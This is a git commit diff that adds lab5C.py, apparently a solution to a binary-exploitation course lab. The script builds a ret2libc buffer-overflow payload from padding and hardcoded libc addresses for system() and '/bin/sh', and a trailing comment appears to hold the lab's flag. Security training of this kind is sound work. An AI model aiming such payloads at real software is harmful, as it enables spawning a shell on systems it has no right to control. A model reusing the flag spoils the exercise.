bc84db32f6e91ec810f560994d7a98bba0a32451
Jalynk2004 <81233886+Jalynk2004@users.noreply.github.com>
2023-03-06 18:05:13 +0700

    Update lab5C.py

--- lab05/lab5C.py
+++ lab05/lab5C.py
@@ -1,1 +1,7 @@
-
+ import struct
+ payload = 'A' * 156
+ payload += "\x90\x31\xe6\xb7" #address of system in libc
+ payload += 'A' * 4 #junk for return address in x86 calling convention
+ payload += "\x24\x3a\xf8\xb7" #address of /bin/sh in libc
+ print(payload)
+#s0m3tim3s_r3t2libC_1s_3n0ugh
